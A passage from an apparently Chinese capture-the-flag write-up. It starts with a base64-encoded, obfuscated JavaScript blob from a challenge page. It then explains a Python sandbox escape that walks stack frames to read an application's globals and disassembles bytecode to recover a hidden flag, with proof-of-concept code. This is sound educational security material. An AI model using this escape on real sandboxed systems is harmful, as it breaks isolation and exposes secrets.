JkSGVoZFFTbzNxOG92RENrd1c1UmNOQ2tuVzViV0E4azlXNHYxVzQzY1BIaGROcldJV09GY1NlbmNXUnpSaUNrY1c1dGRWbW82V1JqdHptbytrY25UVzV1SHZta0h6U29zbW1vaVc1dGRQTXFNV1IvZEwxdGNTU2thVzROZFRta2NrbWt3VzQzZEhDb01XT0MvbnF2RGU4b0xqOG9MV1JkZE9jblZXUXE5QmgzY1AwR21GbWtpVzQwVVc1M2NIU2tSQmcvY0ttby9GdUw3eHRwZFRTbzJXUmxjUGN1UWFXVHhXTzNkSzhvTGNTbzdXUkJjU1NrRVdRYkRXNldmeUpOY1Ztb2tqZVpjUzhvd1c0ZGRObWthVzZuR1dSL2RPTjQ3amg3ZFZDb2pXNU9VVzdTelc1OTl3OG81V1B4ZEc4b2ZXUVNYVzVsY0l0VGVtZkJjVGMzY0tlU2tXN1ZjT0Nva1c0em1XN3p1Vzd0Y09TbzlvQ2s1cDNmZXZTa2x0bWtXVzczZFVtbzlXNWhkTUNrM2NJQmNWcUM5V1FyU1c3bGRIdUJjS0NvWlc2ZGNSTDEyZ2RWY1Ztb3BXNTNkTWEwOEVta0dlbWtTV08wb1dSTGhkOGtZRHZ6d3lnM2RHQ2tKVzR1dUZTb1B1MlMvV1E1NmY4a1dxU29RQVNvZW5ySmRIMW1XRU1CY0p2N2RUTkthV1BMdXNLbGRWQ29oalNrTEVtb1FXUjdjSkNvUldRRmRQeDNkSlNrcGhtb1hXUW4zVzQ3ZEttb2VXNEJkT21vNFdRTFBXNmRkUDhvSmlJL2NWVzBiczhvdVdQZGRQU29Fc04vZEc4bzRXUmZmRTJkY1EzOExXNGZTV1JuT1dReGNVOGs4V1B6ZXIwUmNHbWswY0NrVGZMSEp5VzRmelNvNVc3ZGNMWGpiVzZWY0hYekdXTy9jVEdqaVdPOFZwQ29FV09tcFdRdnV6OGt1V1FOY1NjUmRIU290eVNrN0JtbzVXUTNkR1NraHBjcWlXNGRkUDAwcnlkNUZXUXVmVzYxNlc3V1p1WS9jTzhvdFc3WmRKbWtNRkdiTHFKekNXNVNzV1FKZFIwbVpGbWtMV1BuOVdSNU5sTXBjSkNrbXVTb09XUi9jTFNrWHBiMVZpU29pQlpPM1dPM2RNdER2V1FXNWtyUHJ6dWhkT0NrMVc3VmRNbW9qRkNrQ1dRSmROOG9CeWNUUlc1SHRjQ29JV1FUYXR2cm1zTU5kSXI1MXI4azVFVy9kSkNvUWk4a29XN3YyVzY1blc3dGNUbWtwbnVHOERzM2NOckpkTlNrUmNoVzVoRzlCQmJxd1dRekxXT2RjVkwzZE1HZGRHOGszdG1vUXRhNVdXNmxjUlNrQ2RmalJXUDhrV1FGZFY4b1dXUWRkTVNrMFdQeGRQOGtyakNrZHhta2tkOG9sZzhra1c0WC9XTzVTYkhsZExlNUNXN1pjUEg4Z0I4b0h6bWt5Y2dPeVc0YWp3Q2tLVzVDaERTazZsQ282Vzc1WldSTG1jQ29IenNCY1Vta2hGU29IV1JkZEtNN2NVU2tHbkNrU1c1SmRHQ2sxVzVyYldSUmNTU29SZGRDaldQOGlyTEpjUDhvMldSMDVXN3RjSWREWlc3eGRSSUpjT3dtMFdSYW9xU2toZUt1a1dPcXZXNTBOV1ExckY4b21XUFJkTFNveVc3enFXT3RkTzhrdmdtb0R0OG9CRkdkZEpjMHFvQ29JbG1vMldQYkRXNWxkSFhKZFR4VmNTYy9kU21vMVdSMUd4U29NVzZGZEl0U1RqV3prVzdSZFVta3FXUWhkR0Nrb1dPS2JXNnZWV09IeFdSdGRRTkNLV09hZW5IaGRMTDBZRHV0ZE9Tb2xlSEpjTlNvS0ZnU2pXNUZkVkdEbWUyNThyOGs5dUNvbFdSWmRKQ282VzVaY0tnSFdhbWtCV09QTVdPN2NMU280ZUpWY01JSmNQMUdWVzROY0lDa015bW9EV09kY08ySmNHSnhjU21vRlc1NExzbWtwcENraVdRdGRIMnRjUkx2MWNtbytXT05jTUNrN2V1QmRHRycsJ2tTa2luV1JkU0hXQ3pTa2tjdUZkVUxXJywnV1FLTCcsJ2pTa3FXUHUzcDhrNlc2UGRXUFJjSXh5TVdPVmNSVycsJ2xDa1FnYlZjUGEnLCd5MjdjU21vUXpDb0VXUXZ4amdLUXVXJywnZlc5TXEwQmRSbWtUJywnbFl4Y0xLTmRPU284aENvMldQSmNUWGEnLCdXT2Z0aVNrZFdQeGRHTW1va0cvZFBLVycsJ1c1Q2wnLCcnLCd2ZkhNc3dsZFVTa2ZXNGknLCdBTTNjU21vSGJta2xXUVhxbTF1JywnVzVXaVdRVmRLbWtoV1JGZEt3SycsJ2ZmN2NVc2hkTUhmaGJDazFFbW9IJywnaGdkZE9yOGhxbW9BVzRpJywnZzhvd1dSZldXNTQnLCdXN0dneUNveldPN2NOZ212ZVdTJywnVzQvY0pTb2JEMDlTRldOZFBmYkRrVycsJ0VhUmNMYScsJ2tIUmRSU2t2b3EnLCdnMUpjVXRGY01idmhxU2srRjhvWVc3T1VXN1JjU2Y5M1dPanB0Q2tFcmJwY053SmNJSU5jSUNrUkRta3VXUHBjT0dUV2s4bzdXN1BIVzY3Y1ZTb3ZtOG91V09lL2MzQmNRdlpjUkpLaFc1WHNDOGtPeDJOZFYzTGFXNzdjVEhOZFMwQmRTaEZkS3FKY01tb0RXUWZxV095K2pjbVhXN2YremVkZE5Tb2ZtY3VUQ21vQVc3ZGRJdnlmVzUvY0plV2FXUHo4YThrY1dPcGRMZzRsRmZkY1VKeGNKYVZjUENvVm5tay9XNU9ackNrb1dSN2NLWGhjTjhrVHl1bGRRMGhjSm1vSmFhRmNUbWtrbldkZE04b0NXUjF2VzdOZEhMOUFXUmxkVGdCZElNeVp4dGE3VzZoY1NybllXNzQ2VzUwc1c1VDNXNlpkUENvSFdRM2NJSGRjVHdOY1B0aGNUQ2tVV1JUcmVDb25GdWRjVkNvVVdPeklzYUZjVHhlQlc0eGRWd3Z3VzRuMldQOFdtU2twV1A0b3hjbGNNZmZmVzRicGlXM2RVeHRjVlNvK1c3SmRWU29WV1EvZEhTb3p0YWZxb21rcVdPUGp0U283V1FlMHgzUmROTUJkVk5sZE5ta1h3TG51VzZOY0szcklXN1RFV1JIMkU4bzBXUGhkTkNrK1c2RmRPU2tJejhrTlc2Ymh0U280c2FsY1VnNXdXT3RkUjhvdFc3bWZvaDNjUlduTVdST0lrU29xdUNvbmlmN2RUU2s3dkNvRG1kUmNSbWtQV1BWY1Q4azZXUHhjTmFhVVdQMFBFYk9tcUNvVFdQWmNTbW9XV1E1Tlc2dUdwbWtXd1dpbldPUmNLbWtRV080U1dSL2RRdFczVzdiMFc0SmRUQ2tDV1AwcnRNaGNWaFZjT2cwZFdSTmRQSi9kUUNrcVc2aGRQQ2tFQ21vcVc0L2RTMEpkT1lOZFZtb2ZXT3lQVzRWY0k4b0FXNkcrV085UmxTazdXNUJjU1NvV3dDb0lmU2tHYThvWldPL2RTU290V1BDZVc2blFXUGEwcDB4Y1Bta3hXNFdjV1BUbG1mUmNQc1NmV1BaY0pIWFJmckM3VzVSY1E4by9XNXlCVzU5V3ZHT3BrbW9YV1Juc1dQZjNXN1pjSDhrR2c4b2lqbW9jV1B5VFc2eWlXNnJBV09TQ21hUmNObWt3VzYwUFc1ekNXNXhkVXhwZFFta2dzOGtKdlhiZ1c3ekxCQ2svQnR6WFc3cGNJQ2s3V1J0Y0tDb1N1dHRjUmJwY1FHUmNOME5jSXJXcmU4b255bWthaXdKZElXOXRySUZjVG1rOERNOFdxbWttRENrUFc0TmRJMTNjTXRxMmhTa1FoMmkwQnNkY0pJWmNSU2tGaUp0Y1FTa0h1OGtGeThrNnlzL2RHZi9kUFNrcXJkM2NNdXlCcThvdW1tazlXUHRjUVNveFdRZGRWR2FMRlNrTlc0ODhCdnhkTzhvNXNldGROcVpjSG1vUW1Ta21kZDFiVzQ5dmdXZnFoWHBjUThrWFc0eGNTY3ZYVzVqcmN0dGRMSDNkS05YOGRxbGNWZ3RjVkxKZFBTa2dETlBVRHZ1c1dSdGNUaDhqcHFTM2htaytXNzNkUW1rZ3k4a1VXUXhkS1NrcldReGNVTS9jVThvMHRta1dpdzQ1VzYzY1EyL2RSU2tJb21vZ1c0bGNHQ2s4eENrNmFDa3V6U2tOV1JkY0tmcW5pQ28zV1I0S1dPcGNSd2o0V08zY1BTb2lwQ2tnaW1vRGhZem9XT2F3ZDhvZVc0aGNVOG95ZUpieGdZWmNKOG9RQ3E0ZVdRbGNMdnE4V1FwZFRTb0NXNnhkSEdyZHhjWmRWbWtYelkzY1ViS3BXUVZjSENrNkZYQmRJbW9ZVzZteVc2RHJXNHphc2FHa1dPbVdXNHlHbzNlMGFMZGRRQ29vRFNvb1dQbGRMWlZjUHU5RkJDb0puOGtVV1AvY0h2VmNMY3RkVFNvZFc3TmRRbW8vV09WY1FzRDVXNHlnemNLNFc3YTJ6bW9xclptUkI4b09XUHBjVENvR3hDa3lXT1ZjS1hkZFNzM2NLbWtBV1JoZFNtb0lhOGtub0NvSWNJbGNRQ29UeUNrY1dQbGNMWGhkVVNvN1c1TmRPWHBjTndHY1dQRmNMMEQyQlNvbVdRdGRJOG9oV1BkZFNlL2RTQ281dWZ2R1dSenRXUmlYVzRXbldSM2ROR3orV1JWY1Fta3VtcUxaV1JoZFZJMHdmbW9uVzZWZE1NVzBXNkJkSm1ranRmSDBmMDFRbmViTERDa0loU29raHRaZFJMOHZXNGlIQTF6NnRJTmNQcWZpc2VLcndjWmRVd2RkT3hkZFA4a2RiOG9KQU5WZEttb3plSlZkUzNDWWVtbzRXNEZkTWJwZE9ZVFlXNXZtb0NvWVc2cVFXN1c4VzRKY1A4b3pXUW1ybThvdldRdGRKdThWdUNrMWpncGNKOGsxVzZCZEl0M2NKQ29rZ2ZaY1N3aGRRQ2tBZ0tOZEg4azFEOG93V1JCZEpxVmNVWDk4eThrUFdQN2NSU2tJRjhrNlc1ZWJXUnRjT21vSFdPL2NIU2tYVzRYNlc0T0ZXNUZkTlNrZFdPYjdXNXVHVzR2c2Ftb3dXUUtQVzdaY1Ztb1hkZVZkUzFOZEczdGNOWk5jVDhvc1dRcGRPOGtxRHJaY0l1aWpXNFJjTm1rSldSN2RWQ29jVzVWY1VTa3hGU2tBdVNrSldSUmRPbWtiVzcvZEw4b0pXUFJjSGNWY1BDb0hXNjhzeU1WY0c4azBBTm1FV09OY1BaVmNMR210cm1rRUNta0RwOGs0RGE0Zlc0QmRTWGxkVjhrQ2Vta0RlOG9UaXZOZExDbzBDQ29abDhrWUFtbzFXT1REZHhhN1dReGNHMmE1V1E5TEVOU0VXUGhjU1NvQ1c2QmRTSmpGV1FOZEpDa3B3Q2tuRFNvVVdRM2RUU29qVzdSZFBLYjd4WTFyZUNvbVdPeWhqSXhjSm1rZXhtb0RpSUhObkNreW8zdUJXT1pkVENrb1dSQzNidzk2V1A1SndYV1NsbW9acFdwZFBTa3dXN0JkT3M1TGIxTmNMdFZkTkNvY3Y4bzdrcU9oRG1vWFc3L2NVSUtjaHZMb1dPT0ZlQ283V1BkZEdDb2d1U2tOZjB0Y0t2RmNHU2tlV1J5Z1c3L2NIQ29vV1FCZFZTa2lhOG9FV1JXS1c2R3hXUHJhcXg4NUZJZUNXNWRkVUtQNGRzdGNJYWRkS3Nqclc3VmRHQ2tWVzYvZE5Ta1lXN253Rk10Y09tby9yOGtCVzQzY084b0FXT1pkSk00cVdSSmRWYzljejhrNkJtb2hXNGVBcUdhMWE4b3BXUGRkVHFpSFc1dkZGU2tPczhvQm9Ta0ZXUUxZZWNKY0dDb3lqczErRVNvaXNLSmRVS0ZkSm1ra2RJcGRTU2tkcWUzZE11OE5XNGhjTG1veVc2ak5XUXBjTjNsY0hLWmRKU2t5V1JlZldPdGNPS2pmRG1reFdPQmRITmpaV1I1NldQSEVXUmRjVHR1dVc1OTVXNjBtbHN0Y0t3cldibW8xVzZTeWQwQmRVY0QvV1FCY09Db2F1bWtLVzZyb1dSenhXNE9uVzZxakVTb2dXNlJkSWJkZElncjZsbWtZc0NrZ2tiUzJ5ZEZkT1NrUmdJQmNRbW8zV09SZEtOL2NRU29QYXZ4Y0gwN2RNbWtVV09GY0k4b2RjbWtEcHJISldQRDlGYjV4YUNrUWc4a1RvdXBkVXJEaFdQTDdiU29DV1I0OFdReGRQOGtDdVluQ244a2JXUG0wV1F1bEQyRmRJaC9jS3dXcXNlcW1XNkRkVzRoZFFTbzZXUkJkTU1HN213L2RTOG90V09CY01ta0FXUVR4VzZPWnZ2ZGNNMnZVQVNvSHFDa1pXNC9kUzFqRFdRNGxXN1Q5VzdUa1dRcGNLU29xQTEvY1U4b0dBbW9jQmZSY1VxSmRNQ2twV1FwZFNDb0pXUmlKVzRYd1dSbGNHOG9TQkNvQldPWmRLd0JjS21vM0M4b0dXUC9jTVNvMVdQTmRRU29hVzVhV1c3RmNJU2tVZmM4YVdQN2NJOG80Vzc3Y1NDb1hzOGtic21vVFc3ZkxXUFpkVmZmSkVkZGRVd1ZkSlNrQVc3QmRQY0ZkUk1QTFdSQmRPOG9kV1B6Q1dRUDhXUEJjVm1vMldPbUVvbWtNVzZxRFc3NVZXNTdjUjhrRVdPL2RIU29HV1B5aGxtbzdiU2szVzZxL211akdXUEJkT21rRFc1L2RVbW9JZGU5L2ptb1prMlJkUk5tcFdPcWxXT2Fod21vbmtTb2ZXNjh2RnRCY0lDazdCU2tadXJSY1VTb1BoYnpPY2ZkZE5Tb0ZlYVdpV1Ftd1c1TFVXN0pkS2JPTVdSZGNPU29zVzVYY1c0MEpXNEcyZ21vS0Q4b09XUDNjR1NvMXFDa0lXUmRkTHZqeVc0ZGNKbW9YV1FSZEdTa3prOG9lb21rS2pTa3R2TDdkUFlDVFdSTHZXUUpkVThrVG5aRzRFTVhPQzBqZkJjZnhrQ29mVzZ2eldPN2NVbWt6V1FSY1Jta3lXN0RHV1J4ZFBta1lXUU5jRzhrK3QxdGNUTGxkS0NvTVdQWmRWOGs5dmQzZEdTa0ZyOGtEdzhrR1c0RmROOGt0cjNKY1FhSmRMQ29oaUd5Y1c1T05BOGtGJywneXd4Y09Ta0VXNmknLCdXUTNjVG1rVHJta2YnLCd4SXhkUXFlRycsJ3V0dURXN2hkSFNrWFdQV2UnLCdXUHBkSGEnLCdmcm52V09mOGxIRmRKbWtxVzViM1c3QycsJ1dSdVonLCdXT1JjTkNrNnNTa01XNWZOZlcnLCdsQ29kJywnZkkwaWJXMDVxRycsJ0F3NCcsJ3A4bzZXUFM4VzdLJywnV1FOY1M4bzV6U29nV09wZE1Da2JXUXVXYW1veScsJ2JoTmRMZlBjekNrTFc0ekNDU2tqeEcnLCdXNmJSY2d4Y0dHM2RUbWtWcVNvV0JXJywndXNLJywndXhQbHVMNHN1U29TbTJ0Y0txJywnZ3J5JywnVzVCZE1Tb2JlbW8vV1BlSXdDbzVXNlgzRWEnLCdGTlJkR3FwY1I4azJvbW9ZV1JOY0dKcUInLCdxU2tUJywnYmZ0Y09XQmROYmJocm1rU3lXJywneExlblc1YTgnLCdqWWEnLCdqY2xkTENvSUYzaTZBcScsJ3A4b20nLCdFbW92a3IvZE1hdTBlYScsJ2xIbGRQU2tFbWEnLCdXT3hjUzhrRldPbGRSWFZkUm1vYicsJ0IwSmNPSVQvJ107XzB4MmE4Mz1mdW5jdGlvbigpe3JldHVybiBfMHhlYjg5NDc7fTtyZXR1cm4gXzB4MmE4MygpO31mdW5jdGlvbiBfMHgzNmY3ZDcoKXt2YXIgXzB4M2VmOGI2PV8weDRkNDUsXzB4MmIzOTBiPShmdW5jdGlvbigpe2lmKCd0VWVHdichPT0ndFVlR3YnKXJldHVybiBfMHgzZWFkMmEoXzB4MTBkODY0KTtlbHNle3ZhciBfMHhjNTJlODM9ISFbXTtyZXR1cm4gZnVuY3Rpb24oXzB4MjVkMDYzLF8weDE0YjBhZil7dmFyIF8weDE5YjU2YT1fMHg0ZDQ1O2lmKCdtSFhPeCc9PT1fMHgxOWI1NmEoMHgyMjUsJ0FkQUYnKSlfMHgzNGQ5M2QoXzB4MmQwMWFkKSgpO2Vsc2V7dmFyIF8weDQzNWU0Mz1fMHhjNTJlODM/ZnVuY3Rpb24oKXtpZihfMHgxNGIwYWYpe3ZhciBfMHgyNzhjOWU9XzB4MTRiMGFmWydhcHBseSddKF8weDI1ZDA2Myxhcmd1bWVudHMpO3JldHVybiBfMHgxNGIwYWY9bnVsbCxfMHgyNzhjOWU7fX06ZnVuY3Rpb24oKXt9O3JldHVybiBfMHhjNTJlODM9IVtdLF8weDQzNWU0Mzt9fTt9fSgpKSxfMHgxMjYwMGM9XzB4MmIzOTBiKHRoaXMsZnVuY3Rpb24oKXt2YXIgXzB4NDZiYmY5PV8weDRkNDU7cmV0dXJuIF8weDEyNjAwY1tfMHg0NmJiZjkoMHgyMTEsJ0RHbHQnKV0oKVsnc2VhcmNoJ10oXzB4NDZiYmY5KDB4MjFjLCdER2x0JykpW18weDQ2YmJmOSgweDIwMSwnW1NwdicpXSgpW18weDQ2YmJmOSgweDFmYiwnJmhlXicpXShfMHgxMjYwMGMpWydzZWFyY2gnXSgnKCgoLispKykrKSskJyk7fSk7cmV0dXJuIF8weDEyNjAwYygpLF8weDNlZjhiNigweDIwOSwnWFNETycpK18weDNlZjhiNigweDIxMCwnQkRaVScpK18weDNlZjhiNigweDFmNCwnRHlMRycpK18weDNlZjhiNigweDIyOSwnaGdbQCcpK18weDNlZjhiNigweDIwMiwnWFNETycpK18weDNlZjhiNigweDIyMywnbXBHaScpK18weDNlZjhiNigweDFmNSwnSkFqeScpK18weDNlZjhiNigweDIxOSwnVThOWycpK18weDNlZjhiNigweDFmMiwnVHR4VCcpK18weDNlZjhiNigweDFmNiwnd0E4dCcpK18weDNlZjhiNigweDIwNSwnZSl2TCcpK18weDNlZjhiNigweDIxNCwnZUZVOScpK18weDNlZjhiNigweDIxZiwnWFNETycpO312YXIgXzB4NGQwMzJkPWV2YWwoXzB4MzZmN2Q3KClbJ3NwbGl0J10oXzB4NDJkNjUzKDB4MjEyLCdUdHhUJykpWzB4ZjZhKzB4MTJiOSoweDErLTB4MjIyMV0pLF8weDI4MGJiZj1ldmFsKF8weDM2ZjdkNygpW18weDQyZDY1MygweDIyMCwnQGwqZCcpXShfMHg0MmQ2NTMoMHgyMWUsJ2VFJiQnKSlbMHgyMmIxKy0weDJlKjB4NTIrLTB4MTNmMV0pLF8weDNlZGUxNj1ldmFsKF8weDM2ZjdkNygpW18weDQyZDY1MygweDFmOCwnZiUoaCcpXShfMHg0MmQ2NTMoMHgyMjEsJ0FkQUYnKSlbMHgxZCotMHhkZisweDIqMHhmY2QrLTB4MSoweDY1Ml0pLF8weDEzYTE1NT1ldmFsKF8weDM2ZjdkNygpW18weDQyZDY1MygweDIyNywnbyUkTCcpXShfMHg0MmQ2NTMoMHgyMWIsJzFNYzAnKSlbMHhjMmIqMHgzKy0weDMqLTB4OWMxKy0weDQxYmVdKTsoZnVuY3Rpb24oXzB4NWRhMTViKXtyZXR1cm4gXzB4NWRhMTViKF8weDVkYTE1Yik7fShmdW5jdGlvbihfMHhjNGJlOGQpe3JldHVybiBmdW5jdGlvbihfMHgzYTMxNzYpe3ZhciBfMHg1MTI1MWE9XzB4NGQ0NTtmb3IodmFyIF8weDc5MzZkMD0weDIzMWErMHhlMmYrLTB4MzE0OTtfMHg3OTM2ZDA8MHgxZDAxKzB4MioweDIwKy0weDMzNSoweDk7XzB4NzkzNmQwKyspe2lmKF8weDUxMjUxYSgweDIxNSwnRFVjKScpPT09XzB4NTEyNTFhKDB4MjBiLCdER2x0Jykpe2Zvcih2YXIgXzB4NDE5ODRlPTB4YzgqLTB4MistMHgyMTU3KzB4MjJlNztfMHg0MTk4NGU8LTB4ZjFlKzB4MSoweDFmOWIrLTB4MTAxOTtfMHg0MTk4NGUrKyl7dmFyIF8weDU2ZTBiMD0hW10sXzB4OWU3NTk1PV8weDc2MmMyOCgpW18weDUxMjUxYSgweDIwYSwnSUNCWicpXShfMHg1MTI1MWEoMHgyMTQsJ2VGVTknKSlbMHgxODE4KzB4ZioweDI4NCstMHgxNDljKjB4M10sXzB4Mjc3M2ZlPSgtMHgxYzU1Ky0weDNhKjB4YWErMHg0MzE1KSpfMHg0MTk4NGUvKDB4MSoweGMwNystMHhkKi0weDJkZCstMHgzYioweGQ0KSxfMHgxYjk5ZjE9LTB4MSoweGU3YisweDEyMGQrLTB4N2EqMHg3LSgweDFkYzUqMHgxKzB4MWEzNSotMHgxKy0weGMqMHg0NykqXzB4NDE5ODRlLygtMHgxOTQwKjB4MSsweDI1MzUrLTB4YjkxKTtfMHgxNWE4Y2IoKT49LTB4NyoweDQxKzB4MjY1NyotMHgxKzB4MjgxZSswLjk5OTkmJihfMHg5ZTc1OTU9XzB4YzE2YzE2KClbXzB4NTEyNTFhKDB4MjBjLCdVOE5bJyldKF8weDUxMjUxYSgweDIyYSwnW1NwdicpKVstMHg4MDUrMHgyMDYqMHgxKzB4NjAwXSxfMHg1NmUwYjA9ISFbXSk7XzB4MTU3MTViKF8weDUxMjUxYSgweDIwNywnc0N2TCcpLF8weDllNzU5NVtfMHg1MTI1MWEoMHgyMTMsJ0RocyonKV0oL1x7YVx9L2dtLF8weDI3NzNmZStfMHg1MTI1MWEoMHgxZmUsJ0BsKmQnKSlbJ3JlcGxhY2UnXSgvXHtiXH0vZ20sXzB4MWI5OWYxK18weDUxMjUxYSgweDFmZSwnQGwqZCcpKSk7aWYoXzB4NTZlMGIwKV8weDIwZmRlOCgpO31fMHgzNTQ2OTgoZnVuY3Rpb24oKXtfMHg1ZjRhZDIoXzB4MzFhYzZkKSgpO30sLTB4MjJiOCstMHgzKjB4N2Q5KzB4YzBiKjB4NSksXzB4MzU1YWY4KF8weGNmM2RhYSwweDFjMTArMHg1MDUrLTB4MWY1Myk7fWVsc2V7dmFyIF8weDM4ZDk2MT0hW10sXzB4NDhiOGFhPV8weDM2ZjdkNygpWydzcGxpdCddKF8weDUxMjUxYSgweDIwZSwndChLeCcpKVsweDFhZTIrLTB4N2E5Ky0weDEzMzldLF8weDQ4YTRhYT0oLTB4MjI3YSoweDErMHg3YyoweDFhKzB4MTYxZSkqXzB4NzkzNmQwLygtMHgzKjB4YThkKzB4MjI3NSstMHgyNmEpLF8weDU0ODcwZD0weDIzZmYrMHgxKjB4MTBjZistMHgzNDkyLSgweDE2NjMrLTB4MmEzKi0weDMrLTB4MWUxMCkqXzB4NzkzNmQwLygweDcqLTB4MmYyKy0weDFjYjUrMHgzMWI3KTtfMHgyODBiYmYoKT49LTB4MiotMHg3YWMrLTB4N2QqMHgxMystMHg2MTErMC4wMDAxJiYoXzB4NDhiOGFhPV8weDM2ZjdkNygpW18weDUxMjUxYSgweDIyOCwneEBiSicpXShfMHg1MTI1MWEoMHgxZWYsJ0prYm4nKSlbMHhmMzErMHgyNGQqLTB4MTArLTB4NTY4Ki0weDRdLF8weDM4ZDk2MT0hIVtdKTtfMHg0ZDAzMmQoXzB4NTEyNTFhKDB4MWYzLCdmJShoJyksXzB4NDhiOGFhWydyZXBsYWNlJ10oL1x7YVx9L2dtLF8weDQ4YTRhYStfMHg1MTI1MWEoMHgxZmUsJ0BsKmQnKSlbXzB4NTEyNTFhKDB4MWZhLCcxTWMwJyldKC9ce2JcfS9nbSxfMHg1NDg3MGQrXzB4NTEyNTFhKDB4MWZlLCdAbCpkJykpKTt9fV8weDEzYTE1NShmdW5jdGlvbigpe3ZhciBfMHg0ZDliMzE9XzB4NTEyNTFhO2lmKF8weDRkOWIzMSgweDIwOCwnQWRBRicpIT09J3FGakdoJyl7dmFyIF8weDQzMjgwNz1fMHgxMjQ1NDY/ZnVuY3Rpb24oKXt2YXIgXzB4NTNkYjQ2PV8weDRkOWIzMTtpZihfMHg0YmE0Njcpe3ZhciBfMHgxZDA5MmU9XzB4YWE4M2RkW18weDUzZGI0NigweDIwNCwnNWVFTScpXShfMHgxMzIxMGMsYXJndW1lbnRzKTtyZXR1cm4gXzB4NTY4MTZhPW51bGwsXzB4MWQwOTJlO319OmZ1bmN0aW9uKCl7fTtyZXR1cm4gXzB4M2U3MzU3PSFbXSxfMHg0MzI4MDc7fWVsc2UgXzB4YzRiZThkKF8weGM0YmU4ZCkoKTt9LC0weDEqMHgyMGMzKy0weGMqLTB4MTM3Ky0weDUqLTB4NDA3KSxfMHgxM2ExNTUoXzB4NGQzZmI0LDB4MjM1MSotMHgxKy0weDdiKi0weDMrMHgyM2EyKTt9O30pKCkpOw==&quot;</span>))</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="菜狗工具-2"><a href="#菜狗工具-2" class="headerlink" title="菜狗工具#2"></a>菜狗工具#2</h1><p>python栈帧沙箱逃逸</p><h4 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h4><p>一直往上找，直到找到app.py所在的栈帧，然后读取全局变量，poc：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>():<br>        <span class="hljs-keyword">yield</span> g.gi_frame.f_back<br><br>    g = f()<br>    frame = <span class="hljs-built_in">next</span>(g)<br>    <span class="hljs-built_in">print</span>(frame)<br>    <span class="hljs-built_in">print</span>(frame.f_back)<br>    <span class="hljs-built_in">print</span>(frame.f_back.f_back.f_globals)<br>test()<br></code></pre></td></tr></table></figure><p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240609173019525.png" alt="image-20240609173019525"></p><p>这里因为源码里对flag重复赋值了一次导致直接查app.py的<code>f_globals</code>得不到flag</p><p>需要对其栈帧进行反汇编拿到初次赋值的flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">out = io.StringIO()     <span class="hljs-comment"># 内存创建字符串I/O流</span><br>dis.dis(frame.f_code,file=out)   <span class="hljs-comment"># 将当前堆栈帧所对应的函数的字节码进行反汇编</span><br>content = out.getvalue()    <span class="hljs-comment">#获取反汇编的结果</span><br>out.close()<br><span class="hljs-built_in">print</span>(content)<br></code></pre></td></tr></table></figure><p>参考官方wp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">sys = <span class="hljs-built_in">print</span>.__globals__[<span class="hljs-string">&quot;__builtins__&quot;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>)<br>io = <span class="hljs-built_in">print</span>.__globals__[<span class="hljs-string">&quot;__builtins__&quot;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;io&#x27;</span>)<br>dis = <span class="hljs-built_in">print</span>.__globals__[<span class="hljs-string">&quot;__builtins__&quot;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;dis&#x27;</span>)<br>threading = <span class="hljs-built_in">print</span>.__globals__[<span class="hljs-string">&quot;__builtins__&quot;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;threading&#x27;</span>)<br><span class="hljs-built_in">print</span>(threading.<span class="hljs-built_in">enumerate</span>())     <span class="hljs-comment">#获取所有活跃线程</span><br><span class="hljs-built_in">print</span>(threading.main_thread())    <span class="hljs-comment">#获取主线程</span><br><span class="hljs-built_in">print</span>(threading.main_thread().ident)   <span class="hljs-comment"># 获取主线程标识符</span><br><span class="hljs-built_in">print</span>(sys._current_frames())      <span class="hljs-comment"># 获取所有线程的堆栈帧对象</span><br><span class="hljs-built_in">print</span>(sys._current_frames()[threading.main_thread().ident]) <span class="hljs-comment">#获取到主线程的堆栈帧对象</span><br><br><br>frame = sys._current_frames()[threading.main_thread().ident]<br><br><span class="hljs-keyword">while</span> frame <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>out = io.StringIO()     <span class="hljs-comment"># 内存创建字符串I/O流</span><br>dis.dis(frame.f_code,file=out)   <span class="hljs-comment"># 将当前堆栈帧所对应的函数的字节码进行反汇编</span><br>content = out.getvalue()    <span class="hljs-comment">#获取反汇编的结果</span><br>out.close()<br><span class="hljs-built_in">print</span>(content)<br>frame = frame.f_back<br></code></pre></td></tr></table></figure><p><img 